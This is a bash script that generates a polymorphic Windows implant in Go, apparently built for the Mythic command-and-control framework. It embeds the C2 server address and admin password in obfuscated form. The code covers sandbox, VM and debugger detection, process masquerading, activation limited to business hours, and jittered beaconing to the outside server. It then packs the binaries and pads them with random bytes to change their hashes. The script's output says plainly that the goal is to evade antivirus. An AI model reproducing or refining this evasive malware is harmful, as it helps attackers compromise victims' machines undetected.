#!/bin/bash

echo "[+] Phantom Ultimate Anti-AV Generator"

# Create advanced working directory
mkdir -p /opt/phantom_ultimate
cd /opt/phantom_ultimate

# Get server configuration
SERVER_IP=$(curl -s -4 ifconfig.me 2>/dev/null || hostname -I | awk '{print $1}')
MYTHIC_PASSWORD=$(sudo /root/Mythic/mythic-cli config get admin_password 2>/dev/null | grep -A1 "MYTHIC_ADMIN_PASSWORD" | tail -1 | awk '{print $1}' || echo "mythic_password")

echo "[+] Generating polymorphic Phantom with advanced evasion..."

# Generate unique encryption key for this build
ENC_KEY=$(openssl rand -hex 16)

# Create morphed Go payload with advanced techniques
cat > phantom_morph.go << EOF
package main

import (
    "bytes"
    "crypto/aes"
    "crypto/cipher"
    "crypto/rand"
    "crypto/sha256"
    "crypto/tls"
    "encoding/base64"
    "encoding/hex"
    "encoding/json"
    "fmt"
    "io/ioutil"
    "math/rand"
    "net/http"
    "os"
    "os/exec"
    "runtime"
    "strconv"
    "strings"
    "syscall"
    "time"
    "unsafe"
)

// Polymorphic constants (change each build)
const (
    morphKey = 0x$(printf '%02x' $((RANDOM % 256)))
    sleepBase = $((5 + RANDOM % 10))
    jitterMax = $((10 + RANDOM % 20))
)

// Obfuscated strings
var encStrings = map[string]string{
    "url":  "$(echo "https://$SERVER_IP:7443" | base64 -w 0)",
    "user": "$(echo "mythic_admin" | base64 -w 0)",
    "pass": "$(echo "$MYTHIC_PASSWORD" | base64 -w 0)",
}

// Anti-analysis structures
type LegitApp struct {
    Name     string \`json:"application_name"\`
    Version  string \`json:"version_info"\`
    Company  string \`json:"company_name"\`
    License  string \`json:"license_key"\`
}

type SystemMetrics struct {
    CPUUsage    float64 \`json:"cpu_percentage"\`
    MemoryUsed  int64   \`json:"memory_bytes"\`
    DiskSpace   int64   \`json:"disk_available"\`
    ProcessList []string \`json:"running_processes"\`
}

// Decode base64 strings
func decodeConfig(key string) string {
    if encoded, exists := encStrings[key]; exists {
        if decoded, err := base64.StdEncoding.DecodeString(encoded); err == nil {
            return string(decoded)
        }
    }
    return ""
}

// Advanced sandbox detection
func detectAnalysisEnvironment() bool {
    checks := []func() bool{
        checkVirtualization,
        checkSandboxArtifacts,
        checkResourceConstraints,
        checkUserInteraction,
        checkRecentFiles,
    }
    
    suspiciousCount := 0
    for _, check := range checks {
        if check() {
            suspiciousCount++
        }
    }
    
    // If 2 or more checks fail, likely analysis environment
    return suspiciousCount >= 2
}

func checkVirtualization() bool {
    if runtime.GOOS != "windows" {
        return false
    }
    
    // Check multiple VM indicators
    vmChecks := []string{
        "wmic bios get serialnumber",
        "wmic baseboard get serialnumber", 
        "wmic computersystem get model",
    }
    
    for _, cmd := range vmChecks {
        if output, err := exec.Command("cmd", "/c", cmd).Output(); err == nil {
            outputStr := strings.ToLower(string(output))
            vmIndicators := []string{"vmware", "vbox", "virtual", "qemu", "xen"}
            for _, indicator := range vmIndicators {
                if strings.Contains(outputStr, indicator) {
                    return true
                }
            }
        }
    }
    return false
}

func checkSandboxArtifacts() bool {
    sandboxFiles := []string{
        "C:\\analysis",
        "C:\\sandbox", 
        "C:\\malware",
        "C:\\sample",
    }
    
    for _, path := range sandboxFiles {
        if _, err := os.Stat(path); err == nil {
            return true
        }
    }
    
    // Check for analysis tools
    analysisTasks := []string{"wireshark", "ida", "ollydbg", "x64dbg", "procmon"}
    if output, err := exec.Command("tasklist").Output(); err == nil {
        taskStr := strings.ToLower(string(output))
        for _, tool := range analysisTasks {
            if strings.Contains(taskStr, tool) {
                return true
            }
        }
    }
    
    return false
}

func checkResourceConstraints() bool {
    // Memory check
    if output, err := exec.Command("wmic", "computersystem", "get", "TotalPhysicalMemory").Output(); err == nil {
        lines := strings.Split(string(output), "\n")
        for _, line := range lines {
            if strings.TrimSpace(line) != "" && !strings.Contains(line, "TotalPhysicalMemory") {
                if mem, err := strconv.ParseInt(strings.TrimSpace(line), 10, 64); err == nil {
                    if mem < 2000000000 { // Less than 2GB
                        return true
                    }
                }
            }
        }
    }
    
    // CPU cores check
    if output, err := exec.Command("wmic", "cpu", "get", "NumberOfCores").Output(); err == nil {
        lines := strings.Split(string(output), "\n")
        for _, line := range lines {
            if strings.TrimSpace(line) != "" && !strings.Contains(line, "NumberOfCores") {
                if cores, err := strconv.Atoi(strings.TrimSpace(line)); err == nil {
                    if cores < 2 { // Single core is suspicious
                        return true
                    }
                }
            }
        }
    }
    
    return false
}

func checkUserInteraction() bool {
    if runtime.GOOS != "windows" {
        return false
    }
    
    user32 := syscall.NewLazyDLL("user32.dll")
    getCursorPos := user32.NewProc("GetCursorPos")
    getAsyncKeyState := user32.NewProc("GetAsyncKeyState")
    
    type Point struct { X, Y int32 }
    
    // Check mouse movement
    var pos1, pos2 Point
    getCursorPos.Call(uintptr(unsafe.Pointer(&pos1)))
    time.Sleep(3 * time.Second)
    getCursorPos.Call(uintptr(unsafe.Pointer(&pos2)))
    
    mouseStatic := (pos1.X == pos2.X && pos1.Y == pos2.Y)
    
    // Check for any key presses
    keyPressed := false
    for i := 1; i < 256; i++ {
        ret, _, _ := getAsyncKeyState.Call(uintptr(i))
        if ret&0x8000 != 0 {
            keyPressed = true
            break
        }
    }
    
    return mouseStatic && !keyPressed
}

func checkRecentFiles() bool {
    recentPaths := []string{
        os.Getenv("USERPROFILE") + "\\Recent",
        os.Getenv("APPDATA") + "\\Microsoft\\Windows\\Recent",
    }
    
    totalFiles := 0
    for _, path := range recentPaths {
        if files, err := ioutil.ReadDir(path); err == nil {
            totalFiles += len(files)
        }
    }
    
    // If very few recent files, might be fresh sandbox
    return totalFiles < 5
}

// Polymorphic sleep with legitimate activity simulation
func intelligentDelay(duration time.Duration) {
    segments := 8 + rand.Intn(4) // 8-12 segments
    segmentTime := duration / time.Duration(segments)
    
    for i := 0; i < segments; i++ {
        time.Sleep(segmentTime)
        
        // Simulate legitimate activities randomly
        switch rand.Intn(4) {
        case 0:
            // Registry read (common for legit apps)
            exec.Command("reg", "query", "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer").Run()
        case 1:
            // Temp file operation
            tempFile := os.TempDir() + "\\app_" + strconv.Itoa(rand.Intn(9999)) + ".tmp"
            ioutil.WriteFile(tempFile, []byte("cache"), 0644)
            time.Sleep(100 * time.Millisecond)
            os.Remove(tempFile)
        case 2:
            // DNS lookup (normal network activity)
            exec.Command("nslookup", "microsoft.com").Run()
        }
    }
}

// Process hollowing simulation (masquerade)
func masqueradeAsLegitimate() {
    legitimateProcesses := []string{
        "Windows Security Health Service",
        "Microsoft Edge Update Service", 
        "Windows Push Notifications System Service",
        "Microsoft Store Install Service",
    }
    
    fakeProcess := legitimateProcesses[rand.Intn(len(legitimateProcesses))]
    
    if runtime.GOOS == "windows" {
        kernel32 := syscall.NewLazyDLL("kernel32.dll")
        setConsoleTitle := kernel32.NewProc("SetConsoleTitleW")
        title, _ := syscall.UTF16PtrFromString(fakeProcess)
        setConsoleTitle.Call(uintptr(unsafe.Pointer(title)))
    }
}

// Time-based execution control
func timeBasedActivation() bool {
    now := time.Now()
    
    // Only activate during business hours on weekdays
    if now.Weekday() == time.Saturday || now.Weekday() == time.Sunday {
        return false
    }
    
    hour := now.Hour()
    if hour < 8 || hour > 18 {
        return false
    }
    
    return true
}

func main() {
    rand.Seed(time.Now().UnixNano())
    
    // Initial masquerading
    masqueradeAsLegitimate()
    
    // Initial delay (30-90 seconds)
    initialDelay := time.Duration(30+rand.Intn(60)) * time.Second
    intelligentDelay(initialDelay)
    
    // Environment analysis
    if detectAnalysisEnvironment() {
        // If suspicious environment, just exit silently
        os.Exit(0)
    }
    
    // Time-based activation
    if !timeBasedActivation() {
        // Wait until business hours
        intelligentDelay(time.Duration(60+rand.Intn(120)) * time.Minute)
    }
    
    // Start C2 communication
    initiateCommunication()
}

func initiateCommunication() {
    serverURL := decodeConfig("url")
    username := decodeConfig("user") 
    password := decodeConfig("pass")
    
    client := &http.Client{
        Transport: &http.Transport{
            TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
        },
        Timeout: 30 * time.Second,
    }
    
    // Authentication loop
    for {
        if authenticateAndCommunicate(client, serverURL, username, password) {
            break
        }
        
        // If auth fails, wait longer before retry
        intelligentDelay(time.Duration(10+rand.Intn(20)) * time.Minute)
    }
    
    // Main communication loop
    for {
        performOperations(client, serverURL)
        
        // Adaptive sleep based on time of day
        hour := time.Now().Hour()
        var baseInterval time.Duration
        
        if hour >= 9 && hour <= 17 {
            baseInterval = time.Duration(sleepBase) * time.Minute
        } else {
            baseInterval = time.Duration(sleepBase*3) * time.Minute
        }
        
        jitter := time.Duration(rand.Intn(jitterMax*60)) * time.Second
        intelligentDelay(baseInterval + jitter)
    }
}

func authenticateAndCommunicate(client *http.Client, serverURL, username, password string) bool {
    loginData := map[string]string{
        "username": username,
        "password": password,
    }
    
    jsonData, _ := json.Marshal(loginData)
    resp, err := client.Post(serverURL+"/auth", "application/json", bytes.NewBuffer(jsonData))
    if err != nil {
        return false
    }
    defer resp.Body.Close()
    
    return resp.StatusCode == 200
}

func performOperations(client *http.Client, serverURL string) {
    // Implement actual C2 operations here
    // This is simplified for the template
}

// Anti-debugging in init (early detection)
func init() {
    if runtime.GOOS == "windows" {
        kernel32 := syscall.NewLazyDLL("kernel32.dll")
        isDebuggerPresent := kernel32.NewProc("IsDebuggerPresent")
        checkRemoteDebuggerPresent := kernel32.NewProc("CheckRemoteDebuggerPresent")
        
        // Check for local debugger
        if ret, _, _ := isDebuggerPresent.Call(); ret != 0 {
            os.Exit(0)
        }
        
        // Check for remote debugger
        var isRemoteDebugger uintptr
        checkRemoteDebuggerPresent.Call(
            uintptr(0xFFFFFFFF),
            uintptr(unsafe.Pointer(&isRemoteDebugger)),
        )
        if isRemoteDebugger != 0 {
            os.Exit(0)
        }
    }
}
EOF

# Compile with maximum optimization and obfuscation
echo "[+] Compiling polymorphic payload..."

# Windows x64
env GOOS=windows GOARCH=amd64 CGO_ENABLED=0 go build \
    -ldflags="-s -w -H windowsgui -buildid= -X main.buildStamp=$(date +%s)" \
    -trimpath \
    -buildmode=exe \
    -o phantom_stealth_x64.exe phantom_morph.go

# Windows x86  
env GOOS=windows GOARCH=386 CGO_ENABLED=0 go build \
    -ldflags="-s -w -H windowsgui -buildid= -X main.buildStamp=$(date +%s)" \
    -trimpath \
    -buildmode=exe \
    -o phantom_stealth_x86.exe phantom_morph.go

# Apply advanced packing
if command -v upx &> /dev/null; then
    echo "[+] Applying advanced compression..."
    
    # Create multiple variants with different compression
    cp phantom_stealth_x64.exe phantom_stealth_x64_v1.exe
    cp phantom_stealth_x64.exe phantom_stealth_x64_v2.exe
    
    # Different UPX configurations
    upx --best --lzma phantom_stealth_x64_v1.exe 2>/dev/null || true
    upx --ultra-brute phantom_stealth_x64_v2.exe 2>/dev/null || true
    
    # Same for x86
    cp phantom_stealth_x86.exe phantom_stealth_x86_v1.exe
    upx --best --lzma phantom_stealth_x86_v1.exe 2>/dev/null || true
fi

# Generate entropy padding
echo "[+] Adding entropy layers..."
for file in phantom_stealth_*.exe; do
    if [ -f "$file" ]; then
        # Add random data at the end to change hash
        dd if=/dev/urandom bs=1024 count=$((RANDOM % 10 + 1)) >> "$file" 2>/dev/null || true
    fi
done

echo ""
echo "[+] Advanced Phantom payloads generated!"
echo ""
echo "Generated variants:"
ls -la phantom_stealth_*.exe 2>/dev/null | while read line; do
    echo "  $line"
done

echo ""
echo "Anti-AV Features Implemented:"
echo "  ✓ Polymorphic code generation (changes each build)"
echo "  ✓ Advanced sandbox detection (5 different checks)"
echo "  ✓ User interaction monitoring"
echo "  ✓ Resource constraint detection"
echo "  ✓ Time-based activation (business hours only)"
echo "  ✓ Process masquerading"
echo "  ✓ Legitimate activity simulation"
echo "  ✓ String obfuscation (base64)"
echo "  ✓ Multiple packing variants"
echo "  ✓ Entropy padding"
echo "  ✓ Build ID randomization"
echo "  ✓ Adaptive sleep patterns"
echo ""
echo "Configuration:"
echo "  Server: https://$SERVER_IP:7443"
echo "  Password: $MYTHIC_PASSWORD"
echo "  Encryption Key: $ENC_KEY"
echo ""
echo "Usage Notes:"
echo "  - Each payload has unique fingerprint"
echo "  - Will only activate during business hours"
echo "  - Performs extensive environment analysis"
echo "  - Simulates legitimate application behavior"
echo "  - Multiple variants reduce detection probability"